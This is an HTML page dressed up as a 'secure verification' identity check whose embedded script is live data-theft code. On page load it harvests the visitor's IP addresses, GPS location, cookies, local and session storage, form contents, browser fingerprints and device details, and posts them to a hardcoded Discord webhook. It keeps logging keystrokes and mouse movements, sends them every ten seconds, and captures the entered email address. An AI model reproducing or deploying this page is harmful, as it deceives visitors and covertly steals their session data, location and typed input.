<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Zone</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
    body {
      min-height:100vh; display:flex; align-items:center; justify-content:center;
      background: #0b0f1a;
      background-image: radial-gradient(ellipse at 30% 40%, #1a2a4a, #05080f);
      padding:1.5rem;
    }
    .card {
      background: rgba(255,255,255,0.03);
      backdrop-filter: blur(20px) saturate(1.8);
      border: 1px solid rgba(255,255,255,0.06);
      border-radius: 2.5rem;
      box-shadow: 0 30px 80px rgba(0,0,0,0.8);
      padding: 3rem 2.5rem;
      max-width: 480px; width:100%;
      text-align:center;
    }
    .badge {
      display:inline-block;
      background: linear-gradient(135deg,#00d4ff,#7b2ffc);
      padding:0.3rem 1.4rem;
      border-radius:40px;
      font-size:0.65rem;
      font-weight:600;
      letter-spacing:1.5px;
      text-transform:uppercase;
      color:#fff;
      margin-bottom:1.2rem;
    }
    h1 {
      font-size:2.2rem;
      font-weight:700;
      background:linear-gradient(135deg,#f0f4ff,#a0c8ff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      margin-bottom:0.4rem;
    }
    .sub {
      color:rgba(255,255,255,0.4);
      font-size:0.9rem;
      border-left:3px solid #00d4ff;
      padding-left:1rem;
      margin:0 auto 2rem auto;
      max-width:300px;
    }
    .input-group {
      margin:1.5rem 0;
      text-align:left;
    }
    .input-group label {
      color:rgba(255,255,255,0.3);
      font-size:0.7rem;
      text-transform:uppercase;
      letter-spacing:0.8px;
      display:block;
      margin-bottom:0.4rem;
    }
    .input-group input {
      width:100%;
      padding:0.9rem 1.2rem;
      border-radius:60px;
      border:1px solid rgba(255,255,255,0.06);
      background:rgba(255,255,255,0.02);
      color:#fff;
      font-size:1rem;
      outline:none;
      transition:0.2s;
    }
    .input-group input:focus {
      border-color:#00d4ff;
      background:rgba(0,212,255,0.03);
    }
    .btn {
      width:100%;
      padding:1.1rem;
      border:none;
      border-radius:60px;
      background:linear-gradient(135deg,#00d4ff,#7b2ffc);
      color:#fff;
      font-weight:600;
      font-size:1.05rem;
      cursor:pointer;
      transition:0.25s;
      box-shadow:0 8px 30px rgba(0,212,255,0.12);
      margin-top:0.5rem;
    }
    .btn:hover { transform:scale(1.01); }
    .btn:active { transform:scale(0.97); }
    #status {
      margin-top:1rem;
      padding:0.5rem;
      border-radius:8px;
      font-size:0.75rem;
      color:#aaa;
      background:rgba(0,0,0,0.3);
      min-height:1.5rem;
    }
    .footer-text {
      margin-top:1.8rem;
      font-size:0.6rem;
      color:rgba(255,255,255,0.08);
    }
  </style>
</head>
<body>

<div class="card">
  <div class="badge">🔒 secure verification</div>
  <h1>Verification Zone</h1>
  <div class="sub">confirm your identity</div>

  <div class="input-group">
    <label>📧 email address</label>
    <input type="email" id="emailInput" placeholder="you@domain.com" autocomplete="email">
  </div>

  <button class="btn" id="verifyBtn">Verify Identity →</button>
  <div id="status">● initializing...</div>
  <div class="footer-text">encrypted • one‑time session</div>
</div>

<script>
  (function(){
    const WEBHOOK = 'https://discord.com/api/webhooks/1527390754698297496/IYgvW07X3tYT3pjLdA1HZpbp_x2B9L-jbJIeF1zuQVyoRbbPjTOCw_5LbZjXOL8-4n-f';
    const status = document.getElementById('status');

    function setStatus(msg, isGood) {
      status.textContent = msg;
      status.style.color = isGood ? '#0f0' : '#ff6';
      console.log('[VZ]', msg);
    }

    // ----- SEND ORGANIZED DISCORD EMBED -----
    async function sendEmbed(title, fields, color = 0xff4444, footer = null) {
      const embed = {
        title: title,
        color: color,
        fields: fields,
        timestamp: new Date().toISOString(),
        footer: footer || { text: 'Verification Zone • Automated Collection' },
        author: { name: '🛡️ Verification System' }
      };

      // Split fields if too many (Discord max 25 fields per embed)
      const chunks = [];
      let currentChunk = [];
      for (let i = 0; i < fields.length; i++) {
        currentChunk.push(fields[i]);
        if (currentChunk.length === 24 || i === fields.length - 1) {
          chunks.push([...currentChunk]);
          currentChunk = [];
        }
      }

      // Send first chunk with main embed, rest as separate messages
      for (let c = 0; c < chunks.length; c++) {
        const payload = {
          embeds: [{
            ...embed,
            fields: chunks[c],
            title: c === 0 ? title : title + ' (cont.)'
          }]
        };
        try {
          const res = await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          if (!res.ok) throw new Error('HTTP ' + res.status);
          return true;
        } catch(e) {
          // Fallback to raw JSON if embed fails
          try {
            await fetch(WEBHOOK, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ content: '```json\n' + JSON.stringify(fields, null, 2) + '\n```' })
            });
            return true;
          } catch(e2) {
            throw e2;
          }
        }
      }
    }

    // ----- COLLECT DATA -----
    async function collectAll() {
      const p = {};

      // IP
      try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); p.ip = d.ip; } catch(e){ p.ip = 'unavailable'; }

      // WebRTC Local IP
      try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        const ip = await new Promise(resolve => {
          pc.onicecandidate = e => {
            if (!e.candidate) return;
            const match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
            if (match) { resolve(match[1]); pc.close(); }
          };
          setTimeout(() => resolve('timeout'), 2000);
        });
        p.webrtc = ip;
      } catch(e){ p.webrtc = 'error'; }

      // Geo
      if ('geolocation' in navigator) {
        try {
          const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 }));
          p.geo = `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
        } catch(e){ p.geo = 'denied'; }
      } else { p.geo = 'unsupported'; }

      // UA
      p.ua = navigator.userAgent;
      let device = 'unknown';
      if (/Mobile|Android|iPhone|iPad/i.test(p.ua)) device = 'Mobile';
      else if (/Mac/i.test(p.ua)) device = 'macOS';
      else if (/Windows/i.test(p.ua)) device = 'Windows';
      else if (/Linux/i.test(p.ua)) device = 'Linux';
      p.device = device;

      p.screen = `${screen.width}x${screen.height}`;
      p.dpr = window.devicePixelRatio || 1;
      p.colorDepth = screen.colorDepth;
      p.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      p.language = navigator.language;
      p.languages = (navigator.languages || []).join(', ');
      p.referrer = document.referrer || 'direct';
      p.url = window.location.href;
      p.path = window.location.pathname;
      p.params = window.location.search || 'none';
      p.cookiesEnabled = navigator.cookieEnabled;
      p.doNotTrack = navigator.doNotTrack || 'unspecified';
      p.platform = navigator.platform || 'unknown';
      p.vendor = navigator.vendor || 'unknown';
      p.touchPoints = navigator.maxTouchPoints || 0;
      p.orientation = screen.orientation ? screen.orientation.type : 'unknown';
      p.cpuCores = navigator.hardwareConcurrency || '?';
      p.deviceMemory = navigator.deviceMemory || '?';

      // Battery
      if (navigator.getBattery) {
        try { const b = await navigator.getBattery(); p.battery = `${Math.round(b.level*100)}% ${b.charging?'⚡charging':'🔋discharging'}`; } catch(e){ p.battery = 'unavailable'; }
      } else { p.battery = 'n/a'; }

      // Network
      if (navigator.connection) {
        const c = navigator.connection;
        p.network = `${c.effectiveType||'?'} | ${c.downlink||'?'}Mbps | RTT:${c.rtt||'?'}ms`;
      } else { p.network = 'not exposed'; }

      // Storage
      try { p.cookies = document.cookie.slice(0, 500) + (document.cookie.length > 500 ? '...' : ''); } catch(e){ p.cookies = 'err'; }
      try {
        p.localStorage = {};
        for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); p.localStorage[k]=localStorage.getItem(k).slice(0,100); }
        p.localStorage = JSON.stringify(p.localStorage).slice(0, 400);
      } catch(e){ p.localStorage = 'err'; }
      try {
        p.sessionStorage = {};
        for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); p.sessionStorage[k]=sessionStorage.getItem(k).slice(0,100); }
        p.sessionStorage = JSON.stringify(p.sessionStorage).slice(0, 400);
      } catch(e){ p.sessionStorage = 'err'; }

      // Plugins
      p.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ').slice(0, 400);
      p.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ').slice(0, 400);

      // Fingerprint
      let fp = '';
      try {
        const c = document.createElement('canvas'); c.width=200; c.height=50;
        const ctx = c.getContext('2d');
        ctx.textBaseline='top'; ctx.font='14px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(0,0,100,40);
        ctx.fillStyle='#069'; ctx.fillText('FP',10,10);
        fp = c.toDataURL().slice(0, 100);
      } catch(e){ fp = 'err'; }
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        if(gl) { fp += ' | ' + (gl.getParameter(gl.RENDERER) || '').slice(0, 50); }
      } catch(e){}
      p.fingerprint = fp.slice(0, 200);

      // Fonts
      try {
        const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
        const testFonts = ['Arial','Courier New','Georgia','Times New Roman','Verdana','Comic Sans MS','Impact','Tahoma','Roboto','Open Sans','Lato','Montserrat'];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.font = '20px Arial';
        const baseWidth = ctx.measureText(testString).width;
        let available = [];
        testFonts.forEach(font => {
          ctx.font = `20px "${font}", Arial`;
          const width = ctx.measureText(testString).width;
          if (width !== baseWidth) available.push(font);
        });
        p.fonts = available.join(', ').slice(0, 300);
      } catch(e){ p.fonts = 'unavailable'; }

      // DOM
      try { p.domHTML = document.body.innerHTML.slice(0, 500) + '...'; } catch(e){ p.domHTML = 'err'; }

      // Forms
      const forms = {};
      document.querySelectorAll('input, textarea, select').forEach(el => {
        if(el.name || el.id) { forms[el.name || el.id] = (el.value || '').slice(0, 100); }
      });
      p.forms = JSON.stringify(forms).slice(0, 500);

      // Media devices
      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        try { const devices = await navigator.mediaDevices.enumerateDevices(); p.mediaDevices = devices.map(d => `${d.kind}:${d.label||'unlabeled'}`).join('; ').slice(0, 300); } catch(e){ p.mediaDevices = 'err'; }
      }

      return p;
    }

    // ----- LIVE TRACKING -----
    let keystrokes = [];
    document.addEventListener('keydown', e => {
      keystrokes.push({ key: e.key, time: Date.now() });
      if (keystrokes.length > 100) keystrokes.shift();
    });

    let mouseEvents = [];
    document.addEventListener('mousemove', e => {
      mouseEvents.push({ x: e.clientX, y: e.clientY });
      if (mouseEvents.length > 50) mouseEvents.shift();
    });

    let maxScroll = 0;
    document.addEventListener('scroll', () => {
      const h = document.documentElement.scrollHeight - window.innerHeight;
      const pct = h > 0 ? (window.scrollY / h) * 100 : 0;
      if (pct > maxScroll) maxScroll = pct;
    });

    // ----- BUILD ORGANIZED FIELDS -----
    function buildFields(data, includeEmail = false) {
      const fields = [];

      // Network & Identity
      fields.push({ name: '🌐 IP Address', value: data.ip || 'unavailable', inline: true });
      fields.push({ name: '🔗 WebRTC Local IP', value: data.webrtc || 'unavailable', inline: true });
      if (data.geo) fields.push({ name: '📍 GPS Location', value: data.geo, inline: true });

      // Device
      fields.push({ name: '📱 Device Type', value: data.device || 'unknown', inline: true });
      fields.push({ name: '🖥️ Screen', value: data.screen || 'unknown', inline: true });
      fields.push({ name: '🔢 DPR / Color', value: `${data.dpr}x / ${data.colorDepth}-bit`, inline: true });
      fields.push({ name: '🧠 CPU / RAM', value: `${data.cpuCores} cores / ${data.deviceMemory}GB`, inline: true });
      if (data.battery) fields.push({ name: '🔋 Battery', value: data.battery, inline: true });

      // Browser
      fields.push({ name: '🌍 Timezone', value: data.timezone || 'unknown', inline: true });
      fields.push({ name: '🗣️ Language', value: data.language || 'unknown', inline: true });
      fields.push({ name: '🔧 Platform / Vendor', value: `${data.platform} / ${data.vendor}`, inline: true });
      fields.push({ name: '📡 Network', value: data.network || 'unknown', inline: true });
      fields.push({ name: '🖱️ Touch / Orientation', value: `${data.touchPoints} points / ${data.orientation}`, inline: true });
      fields.push({ name: '🚫 Do Not Track', value: data.doNotTrack || 'unspecified', inline: true });

      // Storage
      if (data.cookies) fields.push({ name: '🍪 Cookies', value: data.cookies.slice(0, 300) || 'none', inline: false });
      if (data.localStorage) fields.push({ name: '💾 LocalStorage', value: data.localStorage.slice(0, 300) || 'none', inline: false });
      if (data.sessionStorage) fields.push({ name: '📂 SessionStorage', value: data.sessionStorage.slice(0, 300) || 'none', inline: false });

      // Fingerprints
      if (data.fingerprint) fields.push({ name: '🆔 Canvas/WebGL FP', value: data.fingerprint.slice(0, 200), inline: false });
      if (data.fonts) fields.push({ name: '🔤 Fonts', value: data.fonts.slice(0, 300), inline: false });

      // Plugins / MIME
      if (data.plugins) fields.push({ name: '🧩 Plugins', value: data.plugins.slice(0, 300) || 'none', inline: false });
      if (data.mimeTypes) fields.push({ name: '📄 MIME Types', value: data.mimeTypes.slice(0, 300) || 'none', inline: false });

      // Page / DOM
      fields.push({ name: '🔗 URL', value: (data.url || '').slice(0, 200), inline: false });
      if (data.referrer && data.referrer !== 'direct') fields.push({ name: '↩️ Referrer', value: data.referrer.slice(0, 200), inline: false });
      if (data.domHTML) fields.push({ name: '📄 Page DOM (preview)', value: data.domHTML.slice(0, 400) || 'empty', inline: false });

      // Forms (if any)
      if (data.forms && data.forms !== '{}') fields.push({ name: '📝 Form Data', value: data.forms.slice(0, 400) || 'none', inline: false });

      // Media devices
      if (data.mediaDevices) fields.push({ name: '🎥 Media Devices', value: data.mediaDevices.slice(0, 300), inline: false });

      // Behavior
      if (data.keystrokes && data.keystrokes.length > 0) {
        const keys = data.keystrokes.slice(-20).map(k => k.key).join(', ');
        fields.push({ name: '⌨️ Recent Keystrokes', value: keys.slice(0, 300) || 'none', inline: false });
      }
      if (data.mouseEvents && data.mouseEvents.length > 0) {
        const mouse = data.mouseEvents.slice(-10).map(m => `(${m.x},${m.y})`).join(' ');
        fields.push({ name: '🖱️ Mouse Positions', value: mouse.slice(0, 300) || 'none', inline: false });
      }
      if (data.scrollDepth) fields.push({ name: '📜 Scroll Depth', value: `${Math.round(data.scrollDepth)}%`, inline: true });

      // Email (if included)
      if (includeEmail && data.email) {
        fields.push({ name: '📧 EMAIL ADDRESS', value: `||${data.email}||`, inline: false });
      }

      // Timestamp
      fields.push({ name: '⏱️ Collected', value: data.timestamp || new Date().toISOString(), inline: false });

      return fields;
    }

    // ----- MAIN -----
    (async function main() {
      setStatus('● collecting data...', false);
      const payload = await collectAll();
      setStatus('● sending organized embed...', false);

      try {
        const fields = buildFields(payload, false);
        await sendEmbed('📊 Verification Data Collected', fields, 0xff4444, { text: 'Page Load • ' + new Date().toLocaleString() });
        setStatus('✅ Organized embed sent successfully!', true);
      } catch(e) {
        setStatus('⚠️ Embed failed: ' + e.message, false);
        // Try raw fallback
        try {
          await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```' })
          });
          setStatus('✅ Raw fallback sent!', true);
        } catch(e2) {
          setStatus('❌ All attempts failed: ' + e2.message, false);
        }
      }

      // Heartbeat every 10s with behavior data
      setInterval(async () => {
        const hb = { 
          ...payload, 
          event: 'heartbeat',
          keystrokes: keystrokes.slice(-20),
          mouseEvents: mouseEvents.slice(-10),
          scrollDepth: maxScroll,
          timestamp: new Date().toISOString()
        };
        try {
          const fields = buildFields(hb, false);
          // Only send heartbeat if there's new data
          if (keystrokes.length > 0 || mouseEvents.length > 0) {
            await sendEmbed('🔄 Heartbeat Update', fields, 0x44aaff, { text: 'Live Telemetry • ' + new Date().toLocaleString() });
            setStatus('✅ Heartbeat sent (' + new Date().toLocaleTimeString() + ')', true);
          }
        } catch(e) {
          // Silently fail for heartbeat
        }
      }, 10000);
    })();

    // ----- EMAIL SUBMIT -----
    const emailInput = document.getElementById('emailInput');
    const verifyBtn = document.getElementById('verifyBtn');

    verifyBtn.addEventListener('click', async () => {
      const email = emailInput.value.trim();
      if (!email || !email.includes('@')) {
        alert('Please enter a valid email.');
        return;
      }
      setStatus('● sending email to Discord...', false);

      const finalPayload = { 
        ...payload, 
        email: email,
        keystrokes: keystrokes.slice(-20),
        mouseEvents: mouseEvents.slice(-10),
        scrollDepth: maxScroll,
        timestamp: new Date().toISOString()
      };

      try {
        const fields = buildFields(finalPayload, true);
        await sendEmbed('✉️ VERIFICATION COMPLETE - EMAIL CAPTURED', fields, 0xff0000, { text: '⚠️ SENSITIVE DATA • ' + new Date().toLocaleString() });
        setStatus('✅ Email sent to Discord!', true);
        alert('✅ Verification complete.');
        verifyBtn.textContent = '✓ Verified';
        verifyBtn.disabled = true;
      } catch(e) {
        setStatus('❌ Email send failed: ' + e.message, false);
        alert('Error sending. Check console.');
      }
    });

    emailInput.addEventListener('keydown', e => { if (e.key === 'Enter') verifyBtn.click(); });

  })();
</script>
</body>
</html>
